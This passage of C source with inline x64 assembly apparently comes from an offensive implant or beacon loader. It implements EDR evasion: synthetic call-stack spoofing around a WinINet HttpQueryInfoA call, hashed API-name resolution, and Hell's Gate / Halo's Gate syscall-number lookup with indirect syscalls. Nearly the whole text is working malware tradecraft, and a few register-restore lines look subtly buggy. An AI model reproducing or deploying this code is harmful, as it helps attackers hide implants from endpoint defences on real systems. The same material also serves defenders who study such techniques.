    wininet_apis wininet      = { 0 };
    resolve_wininet_apis(&wininet);
    setup_synthetic_callstack(&spoof_struct);
    return spoof_synthetic_callstack(
        hRequest,                   // Argument # 1
        dwInfoLevel,                // Argument # 2
        lpBuffer,                   // Argument # 3
        lpdwBufferLength,           // Argument # 4
        &spoof_struct,              // Pointer to Spoof Struct 
        wininet.HttpQueryInfoA,     // Pointer to API Call
        (void *)1,                  // Number of Arguments on Stack (Args 5+)
        lpdwIndex
    ); 
    // return wininet.HttpQueryInfoA(  hRequest,  dwInfoLevel, lpBuffer,  lpdwBufferLength,  lpdwIndex) ;
}

void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out)
{
    for (DWORD i = 0; utf8_string_in[i] != '\0'; i++)
    {
        if (utf8_string_in[i] >= 'A' && utf8_string_in[i] <= 'Z')
        {
            utf8_string_out[i] = utf8_string_in[i] - 'A' + 'a';
        }
        else
        {
            utf8_string_out[i] = utf8_string_in[i];
        }
    }
}

DWORD hash_ascii_string(BYTE* utf8_string)
{
    BYTE lower_string[256] = { 0 };
    DWORD  length = StringLengthA(utf8_string);
    utf8_string_to_lower(utf8_string, lower_string);
    BYTE prime  = 0xE3;
    BYTE seed   = 0xB0;
    BYTE offset = 0xBC;

    DWORD hash = (offset ^ seed);
    for (DWORD i = 0; i < length; ++i) {
        hash ^= (DWORD)lower_string[i];
        hash *= prime;
    }
    return hash;
}

VOID memory_copy(PVOID destination_ptr, PVOID source_ptr, DWORD number_of_bytes) 
{
    BYTE * source      = (BYTE *)source_ptr;
    BYTE * destination = (BYTE *)destination_ptr;
    
    for (DWORD index = 0; index < number_of_bytes; index++)
        destination[index] = source[index];
}


__asm__(
// "Registers RAX, RCX, RDX, R8, R9, R10, and R11 are considered volatile and must be considered destroyed on function calls."
// "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them." 
// -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf

// Spoof ( 
//    RCX,           - API Call Argument # 1
//    RDX,           - API Call Argument # 2
//    r8,            - API Call Argument # 3
//    r9,            - API Call Argument # 4
//    [rsp+0x28],    - &Spoof_Struct - Pointer to Spoof Struct 
//    [rsp+0x30],    - Pointer to API Call
//    [rsp+0x38],    - Number of Arguments on Stack (Args 5+)
//    [rsp+0x40],    - [optional] API Call Argument # 5 (if [rsp+0x38] == 1) 
//    [rsp+0x48],    - [optional] API Call Argument # 6 (if [rsp+0x38] == 2) 
//    [rsp+0x50],    - [optional] API Call Argument # 7 (if [rsp+0x38] == 3) 
// ..)
"spoof_synthetic_callstack:\n"
    "mov rax, r12\n"                      // move r12 into the volatile rax register
    "mov r10, rdi\n"                      // move rdi into the volatile r10 register 
    "mov r11, rsi\n"                      // move rsi into the volatile r11 register
    "pop r12\n"                           // pop the real return address in r12
    "mov rdi, [rsp + 0x20]\n"             // &Spoof_Struct - spoof_synthetic_callstack() [rsp+0x28],    - Pointer to Spoof Struct 
    "mov rsi, [rsp + 0x28]\n"             // spoof_synthetic_callstack() [rsp+0x30],    - Pointer to API Call
    // Save our original non-volatile registers. We will restore these later before returning to our implant
    "mov [rdi + 0x18], r10\n"              // Spoof_Struct.rdi
    "mov [rdi + 0x58], r11\n"              // Spoof_Struct.rsi
    "mov [rdi + 0x60], rax\n"              // Spoof_Struct.r12 ; r12 was saved to rax before clobbered
    "mov [rdi + 0x68], r13\n"              // Spoof_Struct.r13
    "mov [rdi + 0x70], r14\n"              // Spoof_Struct.r14
    "mov [rdi + 0x78], r15\n"              // Spoof_Struct.r15
    // registers rax, r10, r11 are now free to use again
  // rsp offset is now -0x8 for spoof_synthetic_callstack() args since we popped the ret into r12
  "prepare_synthetic_stack_frames:\n"
    "xor r11, r11\n"                      // r11 = loop counter
    "mov r13, [rsp + 0x30]\n"             // r13 = Number of Arguments on Stack (Args 5+)
    //"mov r14, 0x200\n"                  // r14 will hold the offset we need to push 
    "xor r14, r14\n"                      // r14 will hold the offset we need to push 
    "add r14, 0x08\n"
    // "add r14, [rdi + 0x80]\n"          // ThreadStartAddress  (Spoof_Struct.frame_2_stack_frame_size) stack frame size
    "add r14, [rdi + 0x38]\n"             // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
    "add r14, [rdi + 0x30]\n"             // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size 
    "add r14, [rdi + 0x20]\n"             // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size 
    "sub r14, 0x20\n"                     // first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time
    "mov r10, rsp\n"                      
    "add r10, 0x30\n"                     // offset of stack arg added to rsp
  "loop_move_api_call_stack_args:\n"
    "xor r15, r15\n"                      // r15 will hold the offset + rsp base
    "cmp r11, r13\n"                      // comparing # of stack args added vs # of stack args we need to add
  "je create_synthetic_stack_frames\n"
    // Getting location to move the stack arg to
    "sub r14, 0x08\n"                     // 1 arg means r11 is 0, r14 already 0x28 offset
    "mov r15, rsp\n"                      // get current stack base
    "sub r15, r14\n"                      // subtract offset
    // Procuring the stack arg
    "add r10, 0x08\n"
    "push [r10]\n"
    "pop  [r15]\n"                        // move the stack arg into the right location
    // Increment the counter and loop back in case we need more args
    "add r11, 0x01\n"
  "jmp loop_move_api_call_stack_args\n"

  "create_synthetic_stack_frames:\n"
    //"sub rsp, 0x200\n"                  // Create new stack frame
    "push 0x0\n"                          // Push 0 to terminate stackwalk after RtlUserThreadStart stack frame
    // RtlUserThreadStart + 0x14  frame
    "sub rsp,   [rdi + 0x38]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
    "mov r11,   [rdi + 0x40]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_return_address)   return address
    "mov [rsp], r11\n"
    // BaseThreadInitThunk + 0x21 frame
    "sub rsp,   [rdi + 0x20]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size 
    "mov r11,   [rdi + 0x28]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_return_address)   return address
    "mov [rsp], r11\n"
    // ThreadStartAddress  frame
    // "sub rsp,   [rdi + 0x80]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_stack_frame_size) stack frame size 
    // "mov r11,   [rdi + 0x88]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_return_address)   return address
    // "mov [rsp], r11\n"`
    // Gadget frame
    "sub rsp,   [rdi + 0x30]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size 
    "mov r11,   [rdi + 0x50]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_return_address)    return address
    "mov [rsp], r11\n"
    // Adjusting the param struct for the fixup
    "mov r11,          rsi\n"             // Copying function to call into r11
    "mov [rdi + 0x08], r12\n"             // Spoof_Struct.original_return_address 
    "mov [rdi + 0x10], rbx\n"             // Spoof_Struct.rbx - save original rbx to restore later
    "lea rbx,          [rip + fixup]\n"   // Fixup address is moved into rbx
    "mov [rdi],        rbx\n"             // Fixup member now holds the address of Fixup
    "mov rbx,          rdi\n"             // Address of param struct (Fixup) is moved into rbx
    // For indirect syscalls
    "mov r10, rcx\n"           // RCX = API Call Argument # 1
    "mov rax, [rdi + 0x48]\n"
    "jmp r11\n"                // jump to Spoof Struct -> Pointer to API Call
  "fixup:\n" // retore the stack of our implant and return to it
    "mov rcx, rbx\n"
    //"add rsp, 0x200\n"              // adjust RSP frame
    "add rsp, [rbx + 0x30]\n"         // Spoof_Struct.gadget_stack_frame_size
    // "add rsp, [rbx + 0x80]\n"      // Spoof_Struct.frame_2_stack_frame_size
    "add rsp, [rbx + 0x20]\n"         // Spoof_Struct.frame_1_stack_frame_size
    "add rsp, [rbx + 0x38]\n"         // Spoof_Struct.frame_0_stack_frame_size
    "mov rbx, [rcx + 0x10]\n"         // restore original rbx
    "mov rdi, [rcx + 0x18]\n"         // restore original rdi
    "mov rsi, [rcx + 0x58]\n"         // restore original rsi
    "mov r12, [rcx + 0x60]\n"         // restore original r12
    "mov r13, [rcx + 0x68]\n"         // restore original r13
    "mov r14, [rcx + 0x78]\n"         // restore original r14
    "mov r15, [rcx + 0x78]\n"         // restore original r15
    "mov rcx, [rcx + 0x08]\n"         // Spoof_Struct.original_return_address
    "jmp rcx\n"    // return to implant

"returnRDI: \n"
    "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned 
    "ret \n"

"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n"

"getSyscallNumber: \n" // RAX,RCX,RDX
    "push rcx \n"
    "call findSyscallNumber \n"   // try to read the syscall directly
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothooked \n"
    "mov dx, 0 \n"                // index = 0
"loopoversyscalls: \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateUp\n"          // try to read the syscall above
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookedup \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateDown\n"        // try to read the syscall below
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookeddown \n"
    "inc dx \n"                   // increment the index
    "jmp loopoversyscalls \n"
"syscallnothooked: \n"
    "ret \n"
"syscallnothookedup: \n"
    "sub ax, dx \n"
    "ret \n"
"syscallnothookeddown: \n"
    "add ax, dx \n"
    "ret \n"

"findSyscallNumber: \n"  // RAX,RCX,RSI,RDI
    "push rdi \n"
    "push rsi \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "jmp exitfsn \n"
"error: \n"
    "xor rax, rax \n"
"exitfsn:"
    "pop rsi \n"
    "pop rdi \n"
    "ret \n"

"halosGateUp:          \n" // RAX,RSI,RDI,RDX
    "push rdi          \n"
    "push rsi          \n"
    "xor rsi, rsi      \n"
    "xor rdi, rdi      \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax      \n"
    "mov al, 0x20      \n"
    "mul dx            \n"
    "add rcx, rax      \n"
    "mov edi, [rcx]    \n"
    "cmp rsi, rdi      \n"
    "jne HalosGateFail \n"
    "mov ax, [rcx+4]   \n"
    "jmp HalosGateExit \n"

"halosGateDown:        \n" // RAX,RSI,RDI,RDX
    "push rdi          \n"
    "push rsi          \n"
    "xor rsi, rsi      \n"
    "xor rdi, rdi      \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax      \n"
    "mov al, 0x20      \n"
    "mul dx            \n"
    "sub rcx, rax      \n"
    "mov edi, [rcx]    \n"
    "cmp rsi, rdi      \n"
    "jne HalosGateFail \n"
    "mov ax, [rcx+4]   \n"
"HalosGateFail:        \n"
    "xor rax, rax      \n" // return 0x0 if fail to find syscall stub bytes
"HalosGateExit:        \n"
    "pop rsi           \n"
    "pop rdi           \n"
    "ret               \n"

"HellsGate:        \n" // Loads the Syscall number into the R11 register before calling HellDescent()
    "xor r11, r11  \n"
    "mov r11d, ecx \n" // Save Syscall Number in R11
    "ret           \n"

"HellDescent:      \n" // Called directly after HellsGate
    "xor rax, rax  \n"
    "mov r10, rcx  \n"
    "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
    "syscall       \n"
    "ret           \n"

);   
